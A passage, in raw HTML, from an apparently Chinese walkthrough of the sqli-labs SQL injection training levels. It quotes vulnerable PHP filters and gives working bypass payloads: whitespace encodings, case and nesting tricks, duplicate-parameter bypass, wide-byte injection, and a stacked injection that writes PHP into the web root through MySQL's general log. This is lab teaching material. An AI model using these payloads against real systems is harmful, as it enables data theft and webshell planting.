invoke__\">preg_replace</span>(<span class=\"string\">&#x27;/[\\s]/&#x27;</span>,<span class=\"string\">&quot;&quot;</span>, <span class=\"variable\">$id</span>);     </span><br><span class=\"line\"><span class=\"variable\">$id</span>= <span class=\"title function_ invoke__\">preg_replace</span>(<span class=\"string\">&#x27;/[\\/\\\\\\\\]/&#x27;</span>,<span class=\"string\">&quot;&quot;</span>, <span class=\"variable\">$id</span>);    </span><br></pre></td></tr></table></figure>\n\n<p><code>or</code>和<code>and</code>使用双写或者<code>||``&amp;&amp;</code>替换。</p>\n<p>过滤注释使用闭合绕过。</p>\n<p>空格字符绕过</p>\n<p><code>%a0</code>：空格</p>\n<p><code>%09</code>：TAB键（水平）</p>\n<p><code>%0a</code>：新建一行</p>\n<p><code>%0c</code>：新的一页</p>\n<p><code>%0d</code>：return功能</p>\n<p><code>%0b</code>：TAB键（垂直）</p>\n<p><code>%00</code>：空字符</p>\n<h4 id=\"3-3-8-Less-26a\"><a href=\"#3-3-8-Less-26a\" class=\"headerlink\" title=\"3.3.8 Less-26a\"></a>3.3.8 Less-26a</h4><p>无区别。</p>\n<h4 id=\"3-3-9-Less-27\"><a href=\"#3-3-9-Less-27\" class=\"headerlink\" title=\"3.3.9 Less-27\"></a>3.3.9 Less-27</h4><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$id</span>= <span class=\"title function_ invoke__\">preg_replace</span>(<span class=\"string\">&#x27;/[\\/\\*]/&#x27;</span>,<span class=\"string\">&quot;&quot;</span>, <span class=\"variable\">$id</span>);</span><br><span class=\"line\"><span class=\"variable\">$id</span>= <span class=\"title function_ invoke__\">preg_replace</span>(<span class=\"string\">&#x27;/[--]/&#x27;</span>,<span class=\"string\">&quot;&quot;</span>, <span class=\"variable\">$id</span>);</span><br><span class=\"line\"><span class=\"variable\">$id</span>= <span class=\"title function_ invoke__\">preg_replace</span>(<span class=\"string\">&#x27;/[#]/&#x27;</span>,<span class=\"string\">&quot;&quot;</span>, <span class=\"variable\">$id</span>);</span><br><span class=\"line\"><span class=\"variable\">$id</span>= <span class=\"title function_ invoke__\">preg_replace</span>(<span class=\"string\">&#x27;/[ +]/&#x27;</span>,<span class=\"string\">&quot;&quot;</span>, <span class=\"variable\">$id</span>);</span><br><span class=\"line\"><span class=\"variable\">$id</span>= <span class=\"title function_ invoke__\">preg_replace</span>(<span class=\"string\">&#x27;/select/m&#x27;</span>,<span class=\"string\">&quot;&quot;</span>, <span class=\"variable\">$id</span>);</span><br><span class=\"line\"><span class=\"variable\">$id</span>= <span class=\"title function_ invoke__\">preg_replace</span>(<span class=\"string\">&#x27;/select/s&#x27;</span>,<span class=\"string\">&quot;&quot;</span>, <span class=\"variable\">$id</span>);</span><br><span class=\"line\"><span class=\"variable\">$id</span>= <span class=\"title function_ invoke__\">preg_replace</span>(<span class=\"string\">&#x27;/Select/s&#x27;</span>,<span class=\"string\">&quot;&quot;</span>, <span class=\"variable\">$id</span>);</span><br><span class=\"line\"><span class=\"variable\">$id</span>= <span class=\"title function_ invoke__\">preg_replace</span>(<span class=\"string\">&#x27;/SELECT/s&#x27;</span>,<span class=\"string\">&quot;&quot;</span>, <span class=\"variable\">$id</span>);</span><br><span class=\"line\"><span class=\"variable\">$id</span>= <span class=\"title function_ invoke__\">preg_replace</span>(<span class=\"string\">&#x27;/union/s&#x27;</span>,<span class=\"string\">&quot;&quot;</span>, <span class=\"variable\">$id</span>);</span><br><span class=\"line\"><span class=\"variable\">$id</span>= <span class=\"title function_ invoke__\">preg_replace</span>(<span class=\"string\">&#x27;/Union/s&#x27;</span>,<span class=\"string\">&quot;&quot;</span>, <span class=\"variable\">$id</span>);</span><br><span class=\"line\"><span class=\"variable\">$id</span>= <span class=\"title function_ invoke__\">preg_replace</span>(<span class=\"string\">&#x27;/UNION/s&#x27;</span>,<span class=\"string\">&quot;&quot;</span>, <span class=\"variable\">$id</span>);</span><br></pre></td></tr></table></figure>\n\n<p><code>select</code>和<code>union</code>使用大小写绕过和嵌套绕过即可。</p>\n<h4 id=\"3-3-10-Less-27a\"><a href=\"#3-3-10-Less-27a\" class=\"headerlink\" title=\"3.3.10 Less-27a\"></a>3.3.10 Less-27a</h4><p>无区别。</p>\n<h4 id=\"3-3-11-Less-28\"><a href=\"#3-3-11-Less-28\" class=\"headerlink\" title=\"3.3.11 Less-28\"></a>3.3.11 Less-28</h4><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$id</span>= <span class=\"title function_ invoke__\">preg_replace</span>(<span class=\"string\">&#x27;/[\\/\\*]/&#x27;</span>,<span class=\"string\">&quot;&quot;</span>, <span class=\"variable\">$id</span>);</span><br><span class=\"line\"><span class=\"variable\">$id</span>= <span class=\"title function_ invoke__\">preg_replace</span>(<span class=\"string\">&#x27;/[--]/&#x27;</span>,<span class=\"string\">&quot;&quot;</span>, <span class=\"variable\">$id</span>);</span><br><span class=\"line\"><span class=\"variable\">$id</span>= <span class=\"title function_ invoke__\">preg_replace</span>(<span class=\"string\">&#x27;/[#]/&#x27;</span>,<span class=\"string\">&quot;&quot;</span>, <span class=\"variable\">$id</span>);</span><br><span class=\"line\"><span class=\"variable\">$id</span>= <span class=\"title function_ invoke__\">preg_replace</span>(<span class=\"string\">&#x27;/[ +]/&#x27;</span>,<span class=\"string\">&quot;&quot;</span>, <span class=\"variable\">$id</span>);.</span><br><span class=\"line\"><span class=\"variable\">$id</span>= <span class=\"title function_ invoke__\">preg_replace</span>(<span class=\"string\">&#x27;/union\\s+select/i&#x27;</span>,<span class=\"string\">&quot;&quot;</span>, <span class=\"variable\">$id</span>);</span><br></pre></td></tr></table></figure>\n\n<p>不能大小写绕过，嵌套绕过即可。</p>\n<h4 id=\"3-3-12-Less-28a\"><a href=\"#3-3-12-Less-28a\" class=\"headerlink\" title=\"3.3.12 Less-28a\"></a>3.3.12 Less-28a</h4><p>无区别。</p>\n<h4 id=\"3-3-13-Less-29\"><a href=\"#3-3-13-Less-29\" class=\"headerlink\" title=\"3.3.13 Less-29\"></a>3.3.13 Less-29</h4><p>这里主要难点在<code>login.php</code>而不是<code>index.php</code>中。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//提取id</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">java_implimentation</span>(<span class=\"params\"><span class=\"variable\">$query_string</span></span>)</span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"variable\">$q_s</span> = <span class=\"variable\">$query_string</span>;</span><br><span class=\"line\">\t<span class=\"variable\">$qs_array</span>= <span class=\"title function_ invoke__\">explode</span>(<span class=\"string\">&quot;&amp;&quot;</span>,<span class=\"variable\">$q_s</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">foreach</span>(<span class=\"variable\">$qs_array</span> <span class=\"keyword\">as</span> <span class=\"variable\">$key</span> =&gt; <span class=\"variable\">$value</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"variable\">$val</span>=<span class=\"title function_ invoke__\">substr</span>(<span class=\"variable\">$value</span>,<span class=\"number\">0</span>,<span class=\"number\">2</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(<span class=\"variable\">$val</span>==<span class=\"string\">&quot;id&quot;</span>)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"variable\">$id_value</span>=<span class=\"title function_ invoke__\">substr</span>(<span class=\"variable\">$value</span>,<span class=\"number\">3</span>,<span class=\"number\">30</span>); </span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span> <span class=\"variable\">$id_value</span>;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;br&gt;&quot;</span>;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"variable\">$qs</span> = <span class=\"variable\">$_SERVER</span>[<span class=\"string\">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class=\"line\"><span class=\"variable\">$hint</span>=<span class=\"variable\">$qs</span>;</span><br><span class=\"line\"><span class=\"variable\">$id1</span>=<span class=\"title function_ invoke__\">java_implimentation</span>(<span class=\"variable\">$qs</span>);</span><br><span class=\"line\"><span class=\"variable\">$id</span>=<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;id&#x27;</span>];</span><br><span class=\"line\"><span class=\"comment\">//id只能为数字</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">whitelist</span>(<span class=\"variable\">$id1</span>);</span><br><span class=\"line\"><span class=\"variable\">$sql</span>=<span class=\"string\">&quot;SELECT * FROM users WHERE id=&#x27;<span class=\"subst\">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>\n\n<p>这里可以构造两个<code>id</code>，因为<code>java_implimentation()</code>函数只会拿到第一个<code>id</code>去检测，从而使得后面<code>id</code>绕过检测。</p>\n<p>这里根据语言特性绕过可以看本文前面部分。</p>\n<h4 id=\"3-3-14-Less-30\"><a href=\"#3-3-14-Less-30\" class=\"headerlink\" title=\"3.3.14 Less-30\"></a>3.3.14 Less-30</h4><p>没区别。</p>\n<h4 id=\"3-3-15-Less-31\"><a href=\"#3-3-15-Less-31\" class=\"headerlink\" title=\"3.3.15 Less-31\"></a>3.3.15 Less-31</h4><p>没区别。</p>\n<h4 id=\"3-3-16-Less-32\"><a href=\"#3-3-16-Less-32\" class=\"headerlink\" title=\"3.3.16 Less-32\"></a>3.3.16 Less-32</h4><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">check_addslashes</span>(<span class=\"params\"><span class=\"variable\">$string</span></span>)</span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"variable\">$string</span> = <span class=\"title function_ invoke__\">preg_replace</span>(<span class=\"string\">&#x27;/&#x27;</span>. <span class=\"title function_ invoke__\">preg_quote</span>(<span class=\"string\">&#x27;\\\\&#x27;</span>) .<span class=\"string\">&#x27;/&#x27;</span>, <span class=\"string\">&quot;\\\\\\\\\\\\&quot;</span>, <span class=\"variable\">$string</span>);  </span><br><span class=\"line\">    <span class=\"variable\">$string</span> = <span class=\"title function_ invoke__\">preg_replace</span>(<span class=\"string\">&#x27;/\\&#x27;/i&#x27;</span>, <span class=\"string\">&#x27;\\\\\\&#x27;&#x27;</span>, <span class=\"variable\">$string</span>);</span><br><span class=\"line\">    <span class=\"variable\">$string</span> = <span class=\"title function_ invoke__\">preg_replace</span>(<span class=\"string\">&#x27;/\\&quot;/&#x27;</span>, <span class=\"string\">&quot;\\\\\\&quot;&quot;</span>, <span class=\"variable\">$string</span>);      </span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"variable\">$string</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$id</span>=<span class=\"title function_ invoke__\">check_addslashes</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;id&#x27;</span>]);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$sql</span>=<span class=\"string\">&quot;SELECT * FROM users WHERE id=&#x27;<span class=\"subst\">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>\n\n<p>宽字节注入，<code>%df%5c</code>被当做一个汉字，使得<code>&#39;</code>逃逸。</p>\n<p>使用<code>\\</code>转义<code>\\</code>，如<code>\\\\&#39;</code>，第二个<code>\\</code>被转义，使<code>&#39;</code>出来。</p>\n<p>将 utf-8 转换为 utf-16 或 utf-32，例如将 <code>&#39;</code> 转为 utf-16 为<code>�</code></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ <span class=\"built_in\">echo</span> \\&#x27;|iconv -f utf-8 -t utf-16</span><br><span class=\"line\">��<span class=\"string\">&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>这里我的理解是，�在URL编码后为<code>%EF%BF%BD</code>，MySQL 在使用 GBK 编码的时候，<code>%EF%BF</code>被当做一个汉字，<code>%BD</code>与<code>%5c</code>也就是<code>\\</code>被当做一个汉字，因此单引号逃逸出来。</p>\n</blockquote>\n<p>可以让<code>&#39;</code>逃逸出来</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id<span class=\"operator\">=</span><span class=\"number\">1</span>�<span class=\"string\">&#x27;or 1%23</span></span><br></pre></td></tr></table></figure>\n\n<img src=\"/posts/31899/image-20250311002549978.png\" class=\"\" title=\"image-20250311002549978\">\n\n<h4 id=\"3-3-17-Less-33\"><a href=\"#3-3-17-Less-33\" class=\"headerlink\" title=\"3.3.17 Less-33\"></a>3.3.17 Less-33</h4><p>没区别。</p>\n<h4 id=\"3-3-18-Less-34\"><a href=\"#3-3-18-Less-34\" class=\"headerlink\" title=\"3.3.18 Less-34\"></a>3.3.18 Less-34</h4><p>没区别。</p>\n<h4 id=\"3-3-19-Less-35\"><a href=\"#3-3-19-Less-35\" class=\"headerlink\" title=\"3.3.19 Less-35\"></a>3.3.19 Less-35</h4><p>没区别。</p>\n<h4 id=\"3-3-20-Less-36\"><a href=\"#3-3-20-Less-36\" class=\"headerlink\" title=\"3.3.20 Less-36\"></a>3.3.20 Less-36</h4><p>没区别</p>\n<h4 id=\"3-3-21-Less-37\"><a href=\"#3-3-21-Less-37\" class=\"headerlink\" title=\"3.3.21 Less-37\"></a>3.3.21 Less-37</h4><p>没区别。</p>\n<h3 id=\"3-4-Less-38-53\"><a href=\"#3-4-Less-38-53\" class=\"headerlink\" title=\"3.4 Less-38-53\"></a>3.4 Less-38-53</h3><blockquote>\n<p>下面无特殊利用的就当做无区别了。</p>\n</blockquote>\n<h4 id=\"3-4-1-Less-38\"><a href=\"#3-4-1-Less-38\" class=\"headerlink\" title=\"3.4.1 Less-38\"></a>3.4.1 Less-38</h4><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$id</span>=<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;id&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$sql</span>=<span class=\"string\">&quot;SELECT * FROM users WHERE id=&#x27;<span class=\"subst\">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">mysqli_multi_query</span>(<span class=\"variable\">$con1</span>, <span class=\"variable\">$sql</span>)):</span><br><span class=\"line\">    <span class=\"string\">&quot;查询结果&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">print_r</span>(<span class=\"title function_ invoke__\">mysqli_error</span>(<span class=\"variable\">$con1</span>));</span><br></pre></td></tr></table></figure>\n\n<p>产生堆叠的原因在于<code>mysqli_multi_query()</code>函数，它会执行一个或用分号隔开的多个SQL语句。</p>\n<p>堆叠注入可以直接写马GetShell。</p>\n<p>这里先查看mysql配置</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; show variables like <span class=\"string\">&#x27;general%&#x27;</span>;</span><br><span class=\"line\">+------------------+---------------------------------+</span><br><span class=\"line\">| Variable_name    | Value                           |</span><br><span class=\"line\">+------------------+---------------------------------+</span><br><span class=\"line\">| general_log      | OFF                             |</span><br><span class=\"line\">| general_log_file | /var/lib/mysql/e783195a8830.<span class=\"built_in\">log</span> |</span><br><span class=\"line\">+------------------+---------------------------------+</span><br></pre></td></tr></table></figure>\n\n<p>可以看见默认没有开启，首先手动开启。</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id<span class=\"operator\">=</span><span class=\"number\">1</span><span class=\"string\">&#x27;;set global general_log=&quot;ON&quot;;set global general_log_file=&#x27;</span><span class=\"operator\">/</span>var<span class=\"operator\">/</span>www<span class=\"operator\">/</span>html<span class=\"operator\">/</span>Less<span class=\"number\">-38</span><span class=\"operator\">/</span>shell.php<span class=\"string\">&#x27;%23</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; show variables like <span class=\"string\">&#x27;general%&#x27;</span>;</span><br><span class=\"line\">+------------------+---------------------------------+</span><br><span class=\"line\">| Variable_name    | Value                           |</span><br><span class=\"line\">+------------------+---------------------------------+</span><br><span class=\"line\">| general_log      | ON                              |</span><br><span class=\"line\">| general_log_file | /var/www/html/Less-38/shell.php |</span><br><span class=\"line\">+------------------+---------------------------------+</span><br></pre></td></tr></table></figure>\n\n<p>然后就可以写入php代码了</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id<span class=\"operator\">=</span><span class=\"number\">1</span><span class=\"string\">&#x27;;select &#x27;</span><span class=\"operator\">&lt;</span>?php phpinfo();?<span class=\"operator\">&gt;</span><span class=\"string\">&#x27;%23</span></span><br></pre></td></tr></table></figure>\n\n<p>查看文件</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ <span class=\"built_in\">cat</span> /var/www/html/Less-38/shell.php</span><br><span class=\"line\">250311 14:32:51    10 Connect   root@localhost on security</span><br><span class=\"line\">                   10 Init DB   security</span><br><span class=\"line\">                   10 Query     SELECT * FROM <span class=\"built_in\">users</span> WHERE <span class=\"built_in\">id</span>=<span class=\"string\">&#x27;1&#x27;</span>;<span class=\"keyword\">select</span> <span class=\"string\">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span>#<span class=\"string\">&#x27; LIMIT 0,1</span></span><br></pre></td></tr></table></figure>\n\n<p>成功写入，但是可能是权限的问题，没有成功执行。</p>\n<h4 id=\"3-4-2-Less-39\"><a href=\"#3-4-2-Less-39\" class=\"headerlink\" title=\"3.4.2 Less-39\"></a>3.4.2 Less-39</h4><p>无区别</p>\n<h4 id=\"3-4-3-Less-40\"><a href=\"#3-4-3-Less-40\" class=\"headerlink\" title=\"3.4.3 Less-40\"></a>3.4.3 Less-40</h4><p>无区别</p>\n<h4 id=\"3-4-4-Less-41\"><a href=\"#3-4-4-Less-41\" class=\"headerlink\" title=\"3.4.4 Less-41\"></a>3.4.4 Less-41</h4><p>无区别</p>\n<h4 id=\"3-4-5-Less-42\"><a href=\"#3-4-5-Less-42\" class=\"headerlink\" title=\"3.4.5 Less-42\"></a>3.4.5 Less-42</h4><p>类似于<code>Less-24</code>，少了一些过滤。</p>\n<h4 id=\"3-4-6-Less-43\"><a href=\"#3-4-6-Less-43\" class=\"headerlink\" title=\"3.4.6 Less-43\"></a>3.4.6 Less-43</h4><p>无区别。</p>\n<h4 id=\"3-4-7-Less-44\"><a href=\"#3-4-7-Less-44\" class=\"headerlink\" title=\"3.4.7 Less-44\"></a>3.4.7 Less-44</h4><p>无区别。</p>\n<h4 id=\"3-4-8-Less-45\"><a href=\"#3-4-8-Less-45\" class=\"headerlink\" title=\"3.4.8 Less-45\"></a>3.4.8 Less-45</h4><p>无区别。</p>\n<h4 id=\"3-4-9-Less-46\"><a href=\"#3-4-9-Less-46\" class=\"headerlink\" title=\"3.4.9 Less-46\"></a>3.4.9 Less-46</h4><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$id</span>=<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;sort&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$sql</span> = <span class=\"string\">&quot;SELECT * FROM users ORDER BY <span class=\"subst\">$id</span>&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"literal\">true</span></span><br><span class=\"line\">    <span class=\"string\">&quot;查询结果&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">else</span>：</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">print_r</span>(<span class=\"title function_ invoke__\">mysql_error</span>());</span><br></pre></td></tr></table></figure>\n\n<p><code>order by</code>注入，具体看本文order by注入部分。</p>\n<h4 id=\"3-4-10-Less-47\"><a href=\"#3-4-10-Less-47\" class=\"headerlink\" title=\"3.4.10 Less-47\"></a>3.4.10 Less-47</h4><p>无区别。</p>\n<h4 id=\"3-4-11-Less-48\"><a href=\"#3-4-11-Less-48\" class=\"headerlink\" title=\"3.4.11 Less-48\"></a>3.4.11 Less-48</h4><p>无区别。</p>\n<h4 id=\"3-4-12-Less-49\"><a href=\"#3-4-12-Less-49\" class=\"headerlink\" title=\"3.4.12 Less-49\"></a>3.4.12 Less-49</h4><p>无区别。</p>\n<h4 id=\"3-4-13-Less-50\"><a href=\"#3-4-13-Less-50\" class=\"headerlink\" title=\"3.4.13 Less-50\"></a>3.4.13 Less-50</h4><p>无区别。</p>\n<h4 id=\"3-4-14-Less-51\"><a href=\"#3-4-14-Less-51\" class=\"headerlink\" title=\"3.4.14 Less-51\"></a>3.4.14 Less-51</h4><p>无区别。</p>\n<h4 id=\"3-4-15-Less-52\"><a href=\"#3-4-15-Less-52\" class=\"headerlink\" title=\"3.4.15 Less-52\"></a>3.4.15 Less-52</h4><p>无区别。</p>\n<h4 id=\"3-4-16-Less-53\"><a href=\"#3-4-16-Less-53\" class=\"headerlink\" title=\"3.4.16 Less-53\"></a>3.4.16 Less-53</h4><p>无区别。</p>\n<h3 id=\"3-5-Less54-65\"><a href=\"#3-5-Less54-65\" class=\"headerlink\" title=\"3.5 Less54-65\"></a>3.5 Less54-65</h3><h4 id=\"3-5-1-Less-54\"><a href=\"#3-5-1-Less-54\" class=\"headerlink\" title=\"3.5.1 Less-54\"></a>3.5.1 Less-54</h4><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$times</span>= <span class=\"number\">10</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;reset&#x27;</span>]))</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">setcookie</span>(<span class=\"string\">&#x27;challenge&#x27;</span>, <span class=\"string\">&#x27; &#x27;</span>, <span class=\"title function_ invoke__\">time</span>() - <span class=\"number\">3600000</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_COOKIE</span>[<span class=\"string\">&#x27;challenge&#x27;</span>]))</span><br><span class=\"line\">        <span class=\"variable\">$sessid</span>=<span class=\"variable\">$_COOKIE</span>[<span class=\"string\">&#x27;challenge&#x27;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"variable\">$expire</span> = <span class=\"title function_ invoke__\">time</span>()+<span class=\"number\">60</span>*<span class=\"number\">60</span>*<span class=\"number\">24</span>*<span class=\"number\">30</span>;</span><br><span class=\"line\">        <span class=\"variable\">$hash</span> = <span class=\"title function_ invoke__\">data</span>(<span class=\"variable\">$table</span>,<span class=\"variable\">$col</span>);</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">setcookie</span>(<span class=\"string\">&quot;challenge&quot;</span>, <span class=\"variable\">$hash</span>, <span class=\"variable\">$expire</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;id&#x27;</span>]:</span><br><span class=\"line\">        <span class=\"variable\">$sql</span>=<span class=\"string\">&quot;SELECT * FROM security.users WHERE id=&#x27;<span class=\"subst\">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"literal\">true</span></span><br><span class=\"line\">        <span class=\"string\">&quot;查询结果&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>：</span><br><span class=\"line\">       </span><br><span class=\"line\"><span class=\"variable\">$key</span> = <span class=\"title function_ invoke__\">addslashes</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;key&#x27;</span>]);</span><br><span class=\"line\"><span class=\"variable\">$key</span> = <span class=\"title function_ invoke__\">mysql_real_escape_string</span>(<span class=\"variable\">$key</span>);</span><br><span class=\"line\"><span class=\"variable\">$sql</span>=<span class=\"string\">&quot;SELECT 1 FROM <span class=\"subst\">$table</span> WHERE <span class=\"subst\">$col1</span>= &#x27;<span class=\"subst\">$key</span>&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure>\n\n<p>十次以内查出结果</p>\n<p>判断闭合</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id<span class=\"operator\">=</span><span class=\"number\">1</span><span class=\"string\">&#x27;</span></span><br><span class=\"line\"><span class=\"string\">?id=1&#x27;</span><span class=\"operator\">%</span><span class=\"number\">23</span></span><br></pre></td></tr></table></figure>\n\n<p>判断字段数</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id<span class=\"operator\">=</span><span class=\"number\">1</span><span class=\"string\">&#x27;order by 3%23</span></span><br><span class=\"line\"><span class=\"string\">?id=1&#x27;</span><span class=\"keyword\">order</span> <span class=\"keyword\">by</span> <span class=\"number\">4</span><span class=\"operator\">%</span><span class=\"number\">23</span></span><br></pre></td></tr></table></figure>\n\n<p>查数据库名</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id<span class=\"operator\">=</span><span class=\"number\">-1</span><span 